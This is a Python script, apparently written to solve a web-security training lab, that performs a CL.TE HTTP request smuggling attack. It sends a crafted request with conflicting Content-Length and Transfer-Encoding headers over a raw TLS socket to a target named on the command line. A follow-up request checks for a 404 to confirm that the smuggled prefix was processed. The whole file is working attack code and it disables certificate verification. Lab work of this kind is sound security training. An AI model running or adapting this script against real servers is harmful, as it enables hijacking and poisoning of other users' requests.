import socket
import ssl
import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_smuggling_request_twice(target_host, target_port):
    #  smuggling payload
    smuggling_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 35\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET 404/ HTTP/1.1\r\n"
        "X-Ignore: X\r\n"
    )

    try:
        # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context = ssl.create_default_context()
        #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((target_host, target_port)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context.wrap_socket(sock, server_hostname=target_host) as secure_sock:
                              
                print("(+) Sending pyload ...")
                secure_sock.sendall(smuggling_payload.encode())
                print('(+) Smuggled requeste sent . ')
                    # Receive the response
                secure_sock.recv(4096)

        #
#       send a requests to see if we got the not found page

        response=requests.post(url="https://"+target_host,verify=False)
        if response.status_code == 404:
            print("(+) Lab solved successfully . ")              
                    
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s site.com'%sys.argv[0])
        sys.exit()
    target_host=sys.argv[1]
    target_port=443
    send_smuggling_request_twice(target_host,target_port)

if __name__=="__main__":
    main()
